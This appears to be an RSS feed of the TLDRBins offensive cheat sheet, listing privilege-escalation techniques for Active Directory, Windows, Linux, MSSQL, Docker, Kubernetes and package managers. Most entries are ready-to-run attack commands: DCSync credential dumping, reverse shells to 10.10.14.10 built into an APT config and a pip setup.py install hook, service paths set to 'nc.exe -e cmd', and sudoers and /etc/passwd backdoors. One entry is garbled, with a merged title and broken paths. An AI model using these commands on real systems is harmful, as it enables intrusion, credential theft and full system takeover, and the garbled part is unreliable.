channel.title: Privesc on TLDRBins
channel.description: Recent content in Privesc on TLDRBins

item.title: Abuse Parent Child Domain Trusts
item.description: Privesc from DA (Domain Admin) to EA (Enterprise Admin) 1. Check trust relationships # Get all trusted domain objects in a forest Get-ADTrust -Filter * # Returns a list of trusted domains nltest /domain_trusts # Gets a collection of the trust relationships of the current forest ([System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()).GetAllTrustRelationships() 2. Get current and target domain SID ./mimikatz.exe 'lsadump::trust' 'exit' 3. Get krbtgt hash of current domain ./mimikatz.exe 'lsadump::dcsync /all /csv' 'exit' 4.

item.title: Account Operators
item.description: Privesc #1: Create a new user account and add it to LAPS (Local Administrator Password Solution) group 1. Import PowerView.ps1 . .\PowerView.ps1 2. Create cred object (runas) [optional] $username = "<DOMAIN>\<USER>" $password = ConvertTo-SecureString <PASSWORD> -AsPlainText -Force $cred = new-object -typename System.Management.Automation.PSCredential -argumentlist $username, $password 3. Create new user password object $new_user_password = ConvertTo-SecureString <NEW_USER_PASSWORD> -AsPlainText -Force 4. Create new user account # Create a new user New-AdUser <NEW_USER> -enabled $true -accountpassword $new_user_password -Credential $cred # Grant new user privilege (e.

item.title: AddSelf
item.description: Privesc #1: Add self to group (From Linux) powerview.py powerview.py # Connect sudo ntpdate -s <DC> && powerview <DOMAIN>/<USERNAME>:<PASSWORD>@<TARGET_DOMAIN> # Add self to group Add-DomainGroupMember -Identity <TARGET_GROUP> -Members <USERNAME> # Check Get-DomainGroupMember -Identity <TARGET_GROUP> # Exit and login again to apply changes Add-DomainObjectAcl -TargetIdentity <ANOTHER_GROUP> -PrincipalIdentity <USERNAME> -Rights fullcontrol # Check Get-DomainObjectAcl -Identity <TARGET_USER_IN_ANOTHER_GROUP> -Where "SecurityIdentifier contains <USERNAME>" bloodAD bloodyAD python3 bloodyAD.py -d <DOMAIN> -u <USERNAME> -p <PASSWORD> --host <DC> add groupMember <TARGET_GROUP> <USERNAME> # After getting full control of target group (e.

item.title: AllowedToDelegate
item.description: Privesc #1: Forge a Ticket (From Linux) # For example, spn: www/dc.example.com (Check Bloodhound) sudo ntpdate -s <DC> && impacket-getST -dc-ip <DC_IP> -spn www/dc.example.com -hashes :<HASH> -impersonate Administrator <DOMAIN>/<USER> # Export ccache export KRB5CCNAME=Administrator.ccache # Remote sudo ntpdate -s <DC> && wmiexec.py -k -no-pass administrator@dc.example.com Note: impacket-wmiexec may not work

item.title: Apt
item.description: MITM (Man-in-the-Middle) 1. Add proxy path in target machine export http_proxy=http://10.10.14.10:8888 2. Start proxy in local machine # Tool pip3 install --upgrade proxy.py # Start a proxy server proxy --hostname 0.0.0.0 --port 8888 3. Redirect traffic to our server # Edit /etc/hosts 10.10.14.10 apt.update.example.com SUDO # Create a malicious config echo 'APT::Update::Pre-Invoke {"bash -c '\''bash -i >& /dev/tcp/10.10.14.10/1337 0>&1'\''"}' > /etc/apt/apt.conf.d/evil # Exploit sudo apt update -y

item.title: Built-in Group
item.description: Abuse #1. Modify Service Path # Start a nc listener rlwrap nc -lvnp 443 # Assumed nc.exe is uploaded sc.exe config VSS binpath="C:\ProgramData\nc.exe -e cmd 10.10.14.10 443" # Stop service sc.exe stop VSS # Start service sc.exe start VSS

item.title: Docker
item.description: Basic Commands # Show all running processes sudo docker ps -a # Show all images sudo docker images -a # Stop all processes sudo docker stop $(sudo docker ps -a -q) # Remove all processes sudo docker rm -vf $(sudo docker ps -a -q) # Remove all images sudo docker rmi -f $(sudo docker images -aq) Explore Docker image dive dive docker-archive://image.tar Abuse #1: Docker group # List images docker images # Mount host root filesystem docker run -v /:/mnt -it <IMAGE_NAME> bash # Check ls /mnt/root Abuse #2: Docker API # Show running containers curl -s --unix-socket /var/run/docker.

item.title: git
item.description: Basic Commands # Show status git status # Reset the current branch to a previous commit git reset --hard # Show information about files git ls-files --stage # Show current branch git branch # Show commits git log <BRANCH_NAME> --oneline # Show diff, a and b are commit hash # a is the older commit git diff [a] [b] # Show commit git show <COMMIT_HASH> SUDO # Copy target project cp -r /var/www/html/project .

item.title: GPOs
item.description: Abuse #1: Add local admin SharpGPOAbuse 1. List GPOs Name Get-GPO -All | Select-Object DisplayName 2. Add localAdmin .\SharpGPOAbuse.exe --AddLocalADmin --UserAccount <USER> --GPOName <GPO_NAME> 3. Force reload gpupdate /force

item.title: Kubernetes
item.description: Token Location /run/secrets/kubernetes.io/serviceaccount/token Certificate Location /run/secrets/kubernetes.io/serviceaccount/ca.crt Tools kubectl Basic Commands # List all namespaces kubectl --token <TOKEN> --certificate-authority ca.crt --server https://10.10.11.10:8443 get namespaces # Get user permissions in current namespace kubectl --token <TOKEN> --certificate-authority ca.crt --server https://10.10.11.10:8443 auth can-i --list # Get user permissions in specific namespace kubectl --token <TOKEN> --certificate-authority ca.crt --server https://10.10.11.10:8443 auth can-i --list -n <NAMESPACE> # List all pods kubectl --token <TOKEN> --certificate-authority ca.crt --server https://10.

item.title: Linux hard disk encryption
item.description: Brute force LUKS password bruteforce-luks -t 10 -f wordlist.txt -w state.txt -v 30 backup.img Note: This is slow, create a small wordlist Open cryptsetup open --type luks backup.img backup Check ls -l /dev/mapper/ Mount sudo mkdir /mnt/backup sudo mount /dev/mapper/backup /mnt/backup/

item.title: lxd
item.description: Basic Commands # Check if user in lxd group id # List containers lxc list # List images lxc image list Abuse #1: Mount host’s file system # Upload a 656 bytes conatiner image echo  | base64 -d > test.tar.bz2 # Import image lxc image import test.tar.bz2 --alias testImage # Check image lxc image list # Init VM lxc init testImage testVM -c security.privileged=true # Mount the host / lxc config device add testVM realRoot disk source=/ path=r # Start VM lxc start testVM # Check containers lxc list # Execute as root inside container lxc exec testVM -- /bin/bash # We have full access on host disk thru /r/ ls -la /r/root Build image for other arch git clone git clone https://github.

item.title: Metasploit
item.description: Metasploit Start Metasploit msfconsole -q Basic Commands # Return to previous page back # Upgrade session sessions -u # quit metasploit exit Search Exploit # For example: samba search samba # Choose by #num use 15 # Choose by full path use exploit/multi/samba/usermap_script # Show exploit settings options # Set option, e.g. set rhosts 10.10.11.10 set lhost 10.10.14.10 set lport 1337 # Run exploit run Hint: If you see a session is opened, but sit at an empty line, just type your cmd and press enter

item.title: MSSQL Agent Jobs
item.description: 1. Pre-check # List principals SELECT name FROM sys.database_principals; # Check privilege over a principal from current user SELECT entity_name, permission_name FROM fn_my_permissions('<PRINCIPAL>', 'USER'); # Fix : Cannot resolve the collation conflict between "Latin1_General_CI_AI" and "SQL_Latin1_General_CP1_CI_AS" SELECT entity_name collate DATABASE_DEFAULT,permission_name collate DATABASE_DEFAULT FROM fn_my_permissions('<PRINCIPAL>', 'USER'); # Check SQL credentials SELECT name, credential_identity FROM sys.credentials; 2. Check proxy account name and permissions # Create a table to store info CREATE TABLE proxies (subsystem_id INT PRIMARY KEY NOT NULL, subsystem_name varchar(255), proxy_id INT, proxy_name varchar(255)); # Insert proxy info into table EXECUTE AS LOGIN='<PRINCIPAL>'; INSERT proxies EXEC msdb.

item.title: MSSQL Linked Servers
item.description: Linked Servers Basic Commands Hint: Use double '' to escape ' in mssql # Show current server select @@servername # Show linked servers select srvname from sysservers; Execute Query between Linked Servers # Execute query from current server to linked server EXECUTE ('select @@version;') at [<LINKED_SERVER>]; # Execute query from linked server to current server EXECUTE ('EXECUTE (''SELECT entity_name, permission_name FROM fn_my_permissions(NULL, ''''SERVER'''');'') at [<CURRENT_SERVER>]') at [<LINKED_SERVER>]; Abuse #1: Create Admin User from Privilege Linked Server EXECUTE('EXECUTE(''CREATE LOGIN <USER> WITH PASSWORD = ''''<PASSWORD>'''';'') AT [<CURRENT_SERVER>]') AT [<LINKED_SERVER>] EXECUTE('EXECUTE(''EXEC sp_addsrvrolemember ''''<USER>'''', ''''sysadmin'''''') AT [<CURRENT_SERVER>]') AT [<LINKED_SERVER>]

item.title: MSSQL Privilege Escalation
item.description: Abuse #1: Steal NTLM hash # In our local Linux machine sudo responder -I tun0 # Inside mssql terminal xp_dirtree '\\10.10.14.10\any\thing'; # Or use master; exec xp_dirtree '\\10.10.14.10\any\thing'; # Or load_file('\\10.10.14.10\any\thing'); Abuse #2: Run xp_cmdshell # Check any policy blocking xp_cmdshell select name from sys.server_triggers; # Disable trigger if any disable trigger ALERT_xp_cmdshell on all server; # Enable xp_cmdshell enable_xp_cmdshell; # RCE xp_cmdshell whoami Abuse #3: Impersonate sa to run xp_cmdshell execute as login = 'sa'; exec sp_configure 'show advanced options', 1; execute as login = 'sa'; reconfigure; execute as login = 'sa'; exec sp_configure 'xp_cmdshell', 1; execute as login = 'sa'; reconfigure; execute as login = 'sa'; EXEC master.

item.title: npm
item.description: SUDO Create a package.json { "name": "root", "version": "1.0.0", "scripts": { "preinstall": "/bin/bash" } } mkdir test mv package.json test/ sudo npm i test/ --unsafe

item.title: pip
item.description: SUDO 1. Create a setup.py #!/usr/bin/env python3 from setuptools.command.install import install from setuptools import setup import os import socket import subprocess class Exploit(install): def run(self): s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) s.connect(("10.10.14.10",1337)) # CHANGE HERE os.dup2(s.fileno(),0) os.dup2(s.fileno(),1) os.dup2(s.fileno(),2) p = subprocess.call(["/bin/sh", "-i"]) setup( cmdclass={ "install": Exploit } ) 2. Exploit # Run sudo pip install .

item.title: Redis
SeBackupPrivilege/SeRestorePrivilege
item.description:
Abuse #1: Robocopy # For example robocopy /b <TARGET_DIR_PATH> C:\Windows\Tasks <TARGET_FILE> Abuse #2: Using helper dlls SeBackupPrivilegeUtils.dll SeBackupPrivilegeCmdLets.dll import-module .\SeBackupPrivilegeCmdLets.dll import-module .\SeBackupPrivilegeUtils.dll Copy-FileSeBackupPrivilege <TARGET_FILE_PATH> C:\ProgramData\<TARGET_FILE> # For example Copy-FileSeBackupPrivilege C:\Windows
tds
tds.dit C:\ProgramData
tds.dit Abuse #3: Diskshadow 1. Create a .dsh file set context persistent nowriters set metadata C:\ProgramData	est.cab set verbose on add volume c: alias test create expose %test% x: # Convert to dos format unix2dos vss.dsh 2. Run vss.dsh # Upload and run diskshadow /s C:\ProgramData\vss.

item.title: SeDebugPrivilege
item.description: Abuse #1: Meterpreter Migrate # Inside meterpreter ps winlogon migrate <PID> Abuse #2 : psgetsys.ps1 psgetsys # Import module . .\psgetsys.ps1 ImpersonateFromParentPid -ppid <PID> -command "c:\windows\system32\cmd.exe" -cmdargs "/c <powershell #3 Base64>"

item.title: SeImpresonate
item.description: Abuse #1: Recover SeImpresonate FullPower .\FullPowers.exe -c "whoami /priv" # Revshell .\FullPowers.exe -c "<powershell #3 Base64>" Abuse #2: Recover tokens via schedule task # Create a list of privileges [System.String[]]$Privs = "SeAssignPrimaryTokenPrivilege", "SeAuditPrivilege", "SeChangeNotifyPrivilege", "SeCreateGlobalPrivilege", "SeImpersonatePrivilege", "SeIncreaseQuotaPrivilege", "SeIncreaseWorkingSetPrivilege", "SeTimeZonePrivilege" # Create a Principal for the task $TaskPrincipal = New-ScheduledTaskPrincipal -UserId "<SERVICE_ACCOUNT>" -LogonType ServiceAccount -RequiredPrivilege $Privs # Create an action for the task $TaskAction = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-Exec Bypass -Command `C:\\Windows\\Tasks\\nc.

item.title: SeLoadDriverPrivilege
item.description: Abuse #1: Install malicious driver 1. Compile eoploaddriver eoploaddriver.cpp +---------------------------------------------------------------------------------------+ | 1. Open Visual Studio 2022 | | 2. Create a new project | | 3. Project Template : C++ Console App | | 4. Project Name : Eoploaddriver | | 5. Replace code : eoploaddriver.cpp | | 6. Remove header : `include "stdafx.h"` | | 7. Release -> x64 | | 8. Build -> Build Solution | | 9.

item.title: Server Operators
item.description: Abuse #1: Change service path # Change a service path (e.g. browser) sc.exe config browser binPath= "C:\ProgramData\nc.exe -e cmd.exe 10.10.14.10 443" # Stop service sc.exe stop browser # Start service sc.exe stop browser Additional: Create service # Create a service sc.exe create pwn binpath= C:\ProgramData\rev.exe start= auto

item.title: sudoers
item.description: Privesc Abuse /etc/sudoers # IF you have control over `/etc/sudoers` chmod 600 /etc/sudoers echo '<USER> ALL=(ALL) NOPASSWD: ALL' >> /etc/sudoers chmod 440 /etc/sudoers

item.title: Volume Shadow Copies
item.description: Abuse #1: Recover data from shadow copies 1. Check vssadmin list shadows 2. Create symlink and expose the volume cmd /c mklink /d C:\VSS <SHADOW_COPY_VOLUME_PATH> 3. Access ls C:\VSS\Users

item.title: Writable /etc/passwd
item.description: Abuse #1: Writable /etc/passwd # Check ls -l /etc/passwd /etc/shadow # Create password hash openssl passwd -1 password # Add to /etc/passwd echo 'user:$1$mQ8Xk.u8$XjFlyg01xLRjhCK/v//Qe/:0:0:comment:/root:/bin/bash' >> /etc/passwd # Get root shell su - user
